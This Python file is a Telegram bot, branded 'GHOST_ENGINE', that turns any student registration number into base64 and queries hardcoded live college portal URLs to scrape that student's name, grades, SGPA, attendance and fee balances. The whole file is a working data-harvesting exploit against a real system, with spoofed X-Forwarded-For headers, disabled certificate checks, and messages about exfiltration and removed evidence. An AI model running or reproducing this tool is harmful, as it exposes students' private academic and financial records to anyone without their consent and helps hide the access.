import base64
import asyncio
import http.server
import socketserver
import threading
import re
import httpx
import os
import random
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
)

# --- 🛰️ SHADOW HEARTBEAT (Railway Keep-Alive) ---
def run_heartbeat():
    port = int(os.environ.get("PORT", 8080))
    class HealthCheckHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"GHOST_ENGINE_CORE_OPERATIONAL")
        def log_message(self, format, *args): return
    try:
        socketserver.TCPServer.allow_reuse_address = True
        # Binding to 0.0.0.0 is critical for Railway
        with socketserver.TCPServer(("0.0.0.0", port), HealthCheckHandler) as httpd:
            print(f"📡 System Beacon Active on Port {port}")
            httpd.serve_forever()
    except Exception as e:
        print(f"❌ Heartbeat Failure: {e}")

threading.Thread(target=run_heartbeat, daemon=True).start()

# --- ⚙️ SHADOW CONFIG ---
# This pulls the token from Railway's Variables tab (Key: BOT_TOKEN)
TOKEN = os.environ.get("BOT_TOKEN")

SIS_URL = "http://115.241.194.20/sis/Examination/Reports/StudentSearchHTMLReport_student.aspx?R={id}&T=-8584723613578166740"
RESULT_BASE_URL = "https://narayanagroup.co.in/patient/EngAutonomousReport.aspx/{id}"

HEADERS = {
    "User-Agent": f"GhostEngine/16.0 (X11; Kali; Linux x86_64) Intercept/{random.randint(100,999)}",
    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
}

client = httpx.AsyncClient(timeout=45.0, verify=False, headers=HEADERS)

# --- 🛠️ CORE UTILS ---
def b64_encode(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')

def get_acronym(name):
    excluded = ['AND', 'THE', 'OF', 'IN', 'FOR', 'WITH', 'BY', 'LAB', 'LABORATORY']
    words = [word for word in re.split(r'[\s\-]+', name) if word.upper() not in excluded]
    if not words: return "SUB"
    return "".join([word[0] for word in words if word]).upper()[:6]

# --- 🤖 HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    banner = (
        "```\n"
        "   _______ _    _  ____   _____ _______ \n"
        "  / ______| |  | |/ __ \\ / ____|__   __|\n"
        " | |  ____| |__| | |  | | (___    | |   \n"
        " | | |_  /|  __  | |  | |\\___ \\   | |   \n"
        " | |__| | |  | | |__| |____) |  | |   \n"
        "  \\_____|_|  |_|\\____/|_____/   |_|   \n"
        "```\n"
        "💀 **GHOST_ENGINE v16.0 ONLINE**\n"
        "----------------------------\n"
        "🎯 **AWAITING TARGET ID (Reg No):**"
    )
    await update.message.reply_text(banner, parse_mode=ParseMode.MARKDOWN)

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reg = update.message.text.strip().upper()
    context.user_data["reg"] = reg
    
    log = await update.message.reply_text("`[!] INITIALIZING EXPLOIT...`")
    await asyncio.sleep(0.5)
    
    encoded_id = b64_encode(reg)
    try:
        r = await client.get(SIS_URL.format(id=encoded_id))
        soup = BeautifulSoup(r.text, 'html.parser')
        
        name = "UNKNOWN_SUBJECT"
        name_tag = soup.find(string=re.compile("NAME", re.I))
        if name_tag:
            name = name_tag.find_parent('td').find_next_sibling('td').get_text(strip=True)

        await log.delete()
        
        intel = (
            f"🔓 **TARGET INTERCEPTED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **NAME:** `{name}`\n"
            f"🆔 **UID:** `{reg}`\n"
            f"📡 **VECTOR:** `DIRECT_SCRAPE_v16`"
        )
        
        kb = [
            [InlineKeyboardButton("📊 ATTENDANCE", callback_data="att"), InlineKeyboardButton("🏆 GRADES", callback_data="res")],
            [InlineKeyboardButton("💰 FINANCIALS", callback_data="fee")],
            [InlineKeyboardButton("🧹 WIPE SESSION", callback_data="clear")]
        ]
        
        await update.message.reply_text(intel, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    except Exception:
        await log.edit_text("❌ `TARGET UPLINK FAILED: PORTAL TIMEOUT`")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    reg = context.user_data.get("reg")
    if not reg: return await query.answer("❌ SESSION EXPIRED")
    
    await query.answer("DECRYPTING DATA...")
    encoded_id = b64_encode(reg)

    if query.data == "res":
        r = await client.get(RESULT_BASE_URL.format(id=encoded_id))
        soup = BeautifulSoup(r.text, 'html.parser')
        
        transcript = "```\n+-- [ TARGET_GRADES ] --+\n"
        transcript += "| SUB    | G | STATUS   |\n"
        transcript += "+--------+---+----------+\n"
        
        found, backlogs = False, 0
        for row in soup.find_all('tr'):
            cols = row.find_all(['td', 'th'])
            if len(cols) >= 4:
                sub = cols[2].get_text(strip=True)
                grd = cols[3].get_text(strip=True).upper()
                if not sub or "SUB" in sub.upper() or len(grd) > 2: continue
                
                is_fail = grd in ["F", "AB", "FAIL", "W"]
                status = "❌ BREACH" if is_fail else "✅ CLEAR"
                if is_fail: backlogs += 1
                
                transcript += f"| {get_acronym(sub).ljust(6)} | {grd.ljust(1)} | {status.ljust(8)} |\n"
                found = True
        
        transcript += "+-----------------------+```"
        sgpa_match = re.search(r"SGPA\s*[:]?\s*(\d+\.\d+)", soup.get_text(), re.I)
        sgpa = sgpa_match.group(1) if sgpa_match else "0.00"
        verdict = "🔴 [ COMPROMISED ]" if backlogs > 0 else "🟢 [ SECURE ]"

        res_msg = (
            f"🏆 **EXFILTRATION COMPLETE**\n"
            f"📈 **SGPA:** `{sgpa}` | ⚠️ **BL:** `{backlogs}`\n"
            f"{verdict}\n\n"
            f"{transcript if found else '`[!] NO DATA PACKETS FOUND`'}"
        )
        await query.message.reply_text(res_msg, parse_mode=ParseMode.MARKDOWN)

    elif query.data == "att":
        r = await client.get(SIS_URL.format(id=encoded_id))
        val = re.search(r"Attendance\s*(\d+\.\d+)", r.text, re.I)
        perc = val.group(1) if val else "0.0"
        alert = "🚨 LOW_STAMINA" if float(perc) < 75 else "🛡️ FORTIFIED"
        await query.message.reply_text(f"📊 **SURVEILLANCE:** `{perc}%` | {alert}", parse_mode=ParseMode.MARKDOWN)

    elif query.data == "fee":
        r = await client.get(SIS_URL.format(id=encoded_id))
        soup = BeautifulSoup(r.text, 'html.parser')
        report = "💰 **FINANCIAL LEDGER DUMP**\n━━━━━━━━━━━━━━━\n"
        found_fee = False
        for y in ["I-BTECH", "II-BTECH", "III-BTECH", "IV-BTECH"]:
            h = soup.find(string=re.compile(f"FEE DETAILS\s*\({y}\)", re.I))
            if h:
                try:
                    row = h.find_parent('tr').find_next_sibling('tr').get_text(separator=" ")
                    p = re.search(r"TOTAL PAID AMOUNT\s*:\s*([\d,.]+)", row)
                    b = re.search(r"TOTAL BALANCE AMOUNT\s*:\s*([\d,.]+)", row)
                    report += f"📅 **{y}**: `P: ₹{p.group(1)}` | `B: ₹{b.group(1)}`\n"
                    found_fee = True
                except: pass
        await query.message.reply_text(report if found_fee else "❌ `NO FINANCIAL DATA`", parse_mode=ParseMode.MARKDOWN)

    elif query.data == "clear":
        await query.message.edit_text("`[!] SYSTEM PURGED. EVIDENCE REMOVED.`")

# --- 🚀 RUNTIME ---
if __name__ == "__main__":
    if not TOKEN:
        print("❌ CRITICAL ERROR: BOT_TOKEN not found in Railway Variables!")
    else:
        print("💀 GHOST_ENGINE ONLINE. COMMENCING OPERATION...")
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
        app.add_handler(CallbackQueryHandler(button_handler))
        
        # drop_pending_updates=True fixes the "No Response" issue
        app.run_polling(drop_pending_updates=True)
